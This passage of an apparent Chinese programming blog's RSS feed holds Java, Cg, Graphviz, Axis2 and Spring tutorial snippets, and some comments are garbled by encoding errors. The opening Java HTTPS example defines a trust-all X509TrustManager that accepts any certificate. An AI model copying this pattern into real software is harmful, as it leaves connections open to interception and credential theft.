"<A rel="nofollow" href="https://localhost:8443/manager/html"  >https://localhost:8443/manager/html</A>";</P>  <P>&nbsp;&nbsp;URL reqURL = new URL(untrusted2); //&acute;&acute;&frac12;¨URL&para;&Ocirc;&Iuml;ó<BR>&nbsp;&nbsp;HttpsURLConnection httpsConn;<BR>&nbsp;&nbsp;/*<BR>&nbsp;&nbsp;//#1.javax.net.sll.trustStore&Ouml;&cedil;&Iuml;ò&Icirc;&Auml;&frac14;&thorn;dest_cer_store<BR>&nbsp;&nbsp;System.setProperty("javax.net.ssl.trustStore","E:\\Document\\config\\.keystore");<BR>&nbsp;&nbsp;*/<BR>&nbsp;&nbsp;//#2.X509TrustManager-&gt;SSL Context-&gt;SSL SocketFactory-&gt;SSL Connection<BR>&nbsp;&nbsp;TrustManager[] tm = {new MyX509TrustManager ()}; <BR>&nbsp;&nbsp;SSLContext sslContext = SSLContext.getInstance("SSL","SunJSSE"); <BR>&nbsp;&nbsp;sslContext.init(null, tm, new java.security.SecureRandom()); <BR>&nbsp;&nbsp;//&acute;&Oacute;&Eacute;&Iuml;&Ecirc;&ouml;SSLContext&para;&Ocirc;&Iuml;ó&Ouml;&ETH;&micro;&Atilde;&micro;&frac12;SSLSocketFactory&para;&Ocirc;&Iuml;ó<BR>&nbsp;&nbsp;SSLSocketFactory ssf = sslContext.getSocketFactory();<BR>&nbsp;&nbsp;//&acute;&acute;&frac12;¨HttpsURLConnection&para;&Ocirc;&Iuml;ó&pound;&not;&sup2;&cent;&Eacute;è&Ouml;&Atilde;&AElig;&auml;SSLSocketFactory&para;&Ocirc;&Iuml;ó<BR>&nbsp;&nbsp;httpsConn = (HttpsURLConnection)reqURL.openConnection();<BR>&nbsp;&nbsp;httpsConn.setSSLSocketFactory(ssf); </P>  <P>&nbsp;&nbsp;//httpsConn = (HttpsURLConnection)reqURL.openConnection();<BR>&nbsp;&nbsp;InputStreamReader insr = new InputStreamReader(httpsConn.getInputStream());<BR>&nbsp;&nbsp;//&para;&Aacute;&Egrave;&iexcl;·&thorn;&Icirc;&ntilde;&AElig;÷&micro;&Auml;&Iuml;ì&Oacute;&brvbar;&Auml;&Uacute;&Egrave;&Yacute;&sup2;&cent;&Iuml;&Ocirc;&Ecirc;&frac34;<BR>&nbsp;&nbsp;int respInt = insr.read();<BR>&nbsp;&nbsp;while( respInt != -1){<BR>&nbsp;&nbsp;&nbsp;System.out.print((char)respInt);<BR>&nbsp;&nbsp;&nbsp;respInt = insr.read();<BR>&nbsp;&nbsp;}<BR>&nbsp;}<BR>}<BR>class MyX509TrustManager implements X509TrustManager{<BR>&nbsp;public X509Certificate[] getAcceptedIssuers() {return null;}<BR>&nbsp;public void checkServerTrusted(X509Certificate[] chain, String authType) {}<BR>&nbsp;public void checkClientTrusted(X509Certificate[] chain, String authType) {}<BR>}</P>  <P>&nbsp;</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200710174342490/</guid>
    </item>
    <item>
      <title>
<![CDATA[Cg里的while(true)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201031264417971/</link>
      <description>
<![CDATA[传说中，有人用C语言时，#define true false<br>前几天看Cg手册，里面谈到很多语句的限制，看完之后就感得：Cg限制真多<br>今天调Cg程序，在for循环里有一个if-break的条件，后来觉得for循环的次数不好确定，就改成while(true)了，然后就悲剧了，N多测试，莫名其妙得失败啊<br>最后，隐约感觉Cg好像不支持while(true)，改成for(i=1:99999)，调试通过，查Cg手册，上面有这么一句：<br><span style="font-style: italic;">All&nbsp;profiles&nbsp;should&nbsp;support&nbsp;for&nbsp;and&nbsp;while&nbsp;loops&nbsp;if&nbsp;the&nbsp;number&nbsp;of&nbsp;loop </span><br style="font-style: italic;"><span style="font-style: italic;">iterations&nbsp;can&nbsp;be&nbsp;determined&nbsp;at&nbsp;compile&nbsp;time. </span><br>循环次数必须在编译时确定<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201031264417971/</guid>
    </item>
    <item>
      <title>
<![CDATA[Graphviz画个流程图]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010308101876/</link>
      <description>
<![CDATA[看下效果：<br><div><wbr>

<img title="Graphviz画个流程图 - hankjin - 云水居" alt="Graphviz画个流程图 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img767.ph.126.net/MsUFJuHovVDecNxvGBoHIg==/4899634919602541351.png" height="798" width="478"></div>编译命令：<br>dot -Tpng raycaster.dot -o raycaster.png <br>源文件(raycaster.dot)：<br>digraph G {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node[shape=box,width=2];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subgraph cluster_0 {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; style=filled;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node [style=filled,color=white,fontcolor=blue];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; label="红蓝3D";<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; color=lightgray;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 左眼视角 -&gt; 生成FBOLeft -&gt; 右眼视角 -&gt; 生成FBORight -&gt; 合成两个FBO[color=red];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subgraph cluster_1 {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 启用FBO-&gt; 设置投影模式 -&gt; 设置缩放与旋转矩阵 -&gt; 绘制包围盒背面 -&gt; 光线投射;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; label="非红蓝3D";<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; color=black;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 开始 -&gt; 是否红蓝3D;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FBOFinal -&gt; 结束;<br>
  <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 是否红蓝3D -&gt; 左眼视角;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 是否红蓝3D -&gt; 启用FBO;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 合成两个FBO -&gt; FBOFinal;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 光线投射 -&gt; FBOFinal;<br>
  <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 生成FBOLeft -&gt; 启用FBO[style=dotted];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 生成FBORight -&gt; 启用FBO[style=dotted];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 光线投射 -&gt; 生成FBOLeft[style=dotted];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 光线投射 -&gt; 生成FBORight[style=dotted];<br>
  <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 是否红蓝3D[shape=diamond];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 开始[shape=circle,width=1];<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 结束[shape=circle,width=1];<br>
}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010308101876/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Axis2开发Web Service]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200846103359565/</link>
      <description>
<![CDATA[<P>POJO方式和AXIOM方式</P>  <P>目录结构</P>  <P>webapps/axis2/services/StockQuoteServic/{META-INF/services.xml|stock/StockQuoteService.class}</P>  <P>webapps/axis2/services/StockQuoteServicAXIOM/{META-INF/services.xml|stock/StockQuoteServiceAXIOM.class}</P>  <P>POJO：</P>  <P>services.xml</P>  <P>&lt;service name="StockQuoteService" scope="application"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;description&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Stock Quote Sample Service<BR>&nbsp;&nbsp;&nbsp; &lt;/description&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;messageReceivers&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;messageReceiver <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mep="<A rel="nofollow" href="http://www.w3.org/2004/08/wsdl/in-only"  >http://www.w3.org/2004/08/wsdl/in-only</A>"<BR>&nbsp;&nbsp;&nbsp; class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver"/&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;messageReceiver<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mep="<A rel="nofollow" href="http://www.w3.org/2004/08/wsdl/in-out"  >http://www.w3.org/2004/08/wsdl/in-out</A>"<BR>&nbsp;&nbsp;&nbsp; class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/messageReceivers&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;parameter name="ServiceClass"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stock.StockQuoteService<BR>&nbsp;&nbsp;&nbsp; &lt;/parameter&gt;<BR>&lt;/service&gt;</P>  <P>AXIOM(only class Name different):</P>  <P>services.xml</P>  <P>&lt;service name="StockQuoteService" scope="application"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;description&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Stock Quote Sample Service<BR>&nbsp;&nbsp;&nbsp; &lt;/description&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;messageReceivers&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;messageReceiver <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mep="<A rel="nofollow" href="http://www.w3.org/2004/08/wsdl/in-only"  >http://www.w3.org/2004/08/wsdl/in-only</A>"<BR>&nbsp;&nbsp;&nbsp; class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver"/&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;messageReceiver<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mep="<A rel="nofollow" href="http://www.w3.org/2004/08/wsdl/in-out"  >http://www.w3.org/2004/08/wsdl/in-out</A>"<BR>&nbsp;&nbsp;&nbsp; class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/messageReceivers&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;parameter name="ServiceClass"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stock.StockQuoteServiceAXIOM<BR>&nbsp;&nbsp;&nbsp; &lt;/parameter&gt;<BR>&lt;/service&gt;<BR>StockQuoteService.java</P>  <P>package stock;</P>  <P>import java.util.HashMap;</P>  <P>public class StockQuoteService {<BR>&nbsp;&nbsp;&nbsp; private HashMap map = new HashMap();</P>  <P>&nbsp;&nbsp;&nbsp; public double getPrice(String symbol) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Double price = (Double) map.get(symbol);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(price != null){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return price.doubleValue();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 42.00;<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp; public void update(String symbol, double price) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; map.put(symbol, new Double(price));<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR>StockQuoteServiceAXIOM.java</P>  <P>package stock;</P>  <P>import java.util.HashMap;</P>  <P>import javax.xml.stream.XMLStreamException;</P>  <P>import org.apache.axiom.om.OMAbstractFactory;<BR>import org.apache.axiom.om.OMElement;<BR>import org.apache.axiom.om.OMFactory;<BR>import org.apache.axiom.om.OMNamespace;</P>  <P><BR>public class StockQuoteServiceAXIOM {<BR>&nbsp;private HashMap map = new HashMap();</P>  <P>&nbsp;&nbsp;&nbsp; public OMElement getPrice(OMElement element) throws XMLStreamException {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; element.build();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; element.detach();</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement symbolElement = element.getFirstElement();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String symbol = symbolElement.getText();</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String returnText = "42";<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Double price = (Double) map.get(symbol);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(price != null){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; returnText&nbsp; = "" + price.doubleValue();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fac.createOMNamespace("<A rel="nofollow" href="http://axiom.service.quickstart.samples/xsd"  >http://axiom.service.quickstart.samples/xsd</A>", "tns");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement("getPriceResponse", omNs);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value = fac.createOMElement("price", omNs);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value.addChild(fac.createOMText(value, returnText));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp; public void update(OMElement element) throws XMLStreamException {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; element.build();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; element.detach();</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement symbolElement = element.getFirstElement();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String symbol = symbolElement.getText();</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement priceElement = (OMElement)symbolElement.getNextOMSibling();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String price = priceElement.getText();</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; map.put(symbol, new Double(price));<BR>&nbsp;&nbsp;&nbsp; }<BR>}</P>  <P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200846103359565/</guid>
    </item>
    <item>
      <title>
<![CDATA[Spring 入门例子]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832511115999/</link>
      <description>
<![CDATA[<P>1。最简单的例子，spring.jar + myspring.xml + SayHi.java + Test.java</P>  <P>2。i18n测试&nbsp; spring.jar + beans.xml + Test.java + format.properties + format_zh_CN.properties+exception.properties + windows.properties</P>  <P>3。aop测试 spring.jar + aspectjrt.jar + aspectjweaver.jar + cglib-nodep-2.1_3.jar + beans.xml + AOPTest.java + FBI.java + Man.java</P>  <P>1.1myspring.xml</P>  <P>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<BR>&lt;!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN//EN" "<A rel="nofollow" href="http://www.springframework.org/dtd/spring-beans.dtd"  >http://www.springframework.org/dtd/spring-beans.dtd</A>"&gt;<BR>&lt;beans&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;bean id = "myBean" class="SayHi"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;property name="name"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;value&gt;hank&lt;/value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/property&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/bean&gt;<BR>&lt;/beans&gt;<BR></P>  <P>1.2SayHi.java</P>  <P>public class SayHi {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private String name;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void setName(String name){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.name = name;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public String getName(){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return this.name;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; /*methods*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void say(){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.print("Hi, " + getName());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>  <P>1.3Test.java</P>  <P>import org.springframework.context.ApplicationContext;<BR>import org.springframework.context.support.FileSystemXmlApplicationContext;</P>  <P>public class Test {<BR>&nbsp;public static void main(String argv[]){<BR>&nbsp;&nbsp;//1. init context<BR>&nbsp;&nbsp;ApplicationContext ctx = new FileSystemXmlApplicationContext("myspring.xml");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;//2. get bean.<BR>&nbsp;&nbsp;SayHi sh = (SayHi)ctx.getBean("myBean");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;//3. invoke method<BR>&nbsp;&nbsp;sh.say();<BR>&nbsp;}<BR>}<BR>2.1 beans.xml</P>  <P>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<BR>&lt;!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN//EN" "<A rel="nofollow" href="http://www.springframework.org/dtd/spring-beans.dtd"  >http://www.springframework.org/dtd/spring-beans.dtd</A>"&gt;<BR>&lt;beans&gt;<BR>&nbsp; &lt;bean id="messageSource"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; class="org.springframework.context.support.ResourceBundleMessageSource"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;property name="basenames"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;list&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;value&gt;format&lt;/value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;value&gt;exception&lt;/value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;value&gt;windows&lt;/value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/list&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/property&gt;<BR>&nbsp; &lt;/bean&gt;<BR>&lt;/beans&gt;<BR></P>  <P>2.2 Test.java</P>  <P>import org.springframework.context.MessageSource;<BR>import org.springframework.context.support.ClassPathXmlApplicationContext;</P>  <P>public class Test {<BR>&nbsp;public static void main(String[] args) {<BR>&nbsp;&nbsp;MessageSource resources = new ClassPathXmlApplicationContext("beans.xml");<BR>&nbsp;&nbsp;/**<BR>&nbsp;&nbsp;getMessage<BR>&nbsp;&nbsp;public String getMessage(String code,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Object[] args,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Locale locale)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throws NoSuchMessageExceptionDescription copied from interface: MessageSource <BR>&nbsp;&nbsp;Try to resolve the message. Treat as an error if the message can't be found. </P>  <P>&nbsp;&nbsp;Specified by:<BR>&nbsp;&nbsp;getMessage in interface MessageSource<BR>&nbsp;&nbsp;Parameters:<BR>&nbsp;&nbsp;code - the code to lookup up, such as 'calculator.noRateSet'<BR>&nbsp;&nbsp;args - Array of arguments that will be filled in for params within the message (params look like "{0}", "{1,date}", "{2,time}" within a message), or null if none.<BR>&nbsp;&nbsp;locale - the Locale in which to do the lookup <BR>&nbsp;&nbsp;Returns:<BR>&nbsp;&nbsp;the resolved message <BR>&nbsp;&nbsp;Throws: <BR>&nbsp;&nbsp;NoSuchMessageException - if the message wasn't found<BR>&nbsp;&nbsp;See Also:<BR>&nbsp;&nbsp;MessageFormat<BR>&nbsp;&nbsp;*/<BR>&nbsp;&nbsp;String message = resources.getMessage("message", null, "Default", null);<BR>&nbsp;&nbsp;System.out.println(message);<BR>&nbsp;}<BR>}</P>  <P>2.3 format.properties</P>  <P>message=Alligators rock!</P>  <P>2.4 format_zh_CN.properties</P>  <P>#message=中文了, use native2ascii command to generate the below msg<BR>message=\中\文\了</P>  <P>2.5 exception.properties</P>  <P>argument.required=The '{0}' argument is required</P>  <P>3.1 beans.xml</P>  <P>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<BR>&lt;beans xmlns="<A rel="nofollow" href="http://www.springframework.org/schema/beans"  >http://www.springframework.org/schema/beans</A>"<BR>&nbsp;&nbsp;&nbsp; xmlns:xsi="<A rel="nofollow" href="http://www.w3.org/2001/XMLSchema-instance"  >http://www.w3.org/2001/XMLSchema-instance</A>"<BR>&nbsp;&nbsp;&nbsp; xmlns:aop="<A rel="nofollow" href="http://www.springframework.org/schema/aop"  >http://www.springframework.org/schema/aop</A>"<BR>&nbsp;&nbsp;&nbsp; xsi:schemaLocation="<A rel="nofollow" href="http://www.springframework.org/schema/beans"  >http://www.springframework.org/schema/beans</A> <A rel="nofollow" href="http://www.springframework.org/schema/beans/spring-beans-2.0.xsd"  >http://www.springframework.org/schema/beans/spring-beans-2.0.xsd</A>&nbsp; <A rel="nofollow" href="http://www.springframework.org/schema/aop"  >http://www.springframework.org/schema/aop</A> <A rel="nofollow" href="http://www.springframework.org/schema/aop/spring-aop-2.0.xsd"  >http://www.springframework.org/schema/aop/spring-aop-2.0.xsd</A>"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;bean id="fbi" class="FBI" /&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;bean id="man" class="Man"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;property name="name"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;value type="java.lang.String"&gt;hank&lt;/value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/property&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/bean&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;aop:config&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;aop:pointcut id="manPointcut"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; expression="execution(* Man.*(..))" /&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;aop:aspect id="beforeExample" ref="fbi"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;aop:before pointcut-ref="manPointcut" method="before" /&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/aop:aspect&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/aop:config&gt;</P>  <P>&lt;/beans&gt;<BR>3.2 Man.java</P>  <P>public class Man {<BR>&nbsp;&nbsp;&nbsp; private String name;<BR>&nbsp;&nbsp;&nbsp; public String getName() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return name;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; public void setName(String name) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.name = name;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; public void qq() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("&Icirc;&Ograve;&Ocirc;&Uacute;&Aacute;&Auml;QQ");<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; public void mm() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("&Icirc;&Ograve;&Ocirc;&Uacute;&Aring;&Yacute;MM");<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>  <P>3.3 FBI.java</P>  <P>import 